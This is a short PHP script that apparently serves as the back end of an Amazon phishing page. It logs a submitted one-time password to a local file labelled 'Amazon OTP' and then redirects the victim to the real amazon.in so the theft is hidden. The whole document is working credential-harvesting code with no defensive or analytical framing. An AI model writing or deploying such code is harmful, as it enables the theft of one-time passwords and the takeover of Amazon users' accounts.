<?php
file_put_contents("otp.txt", "Amazon OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.amazon.in/');
?>
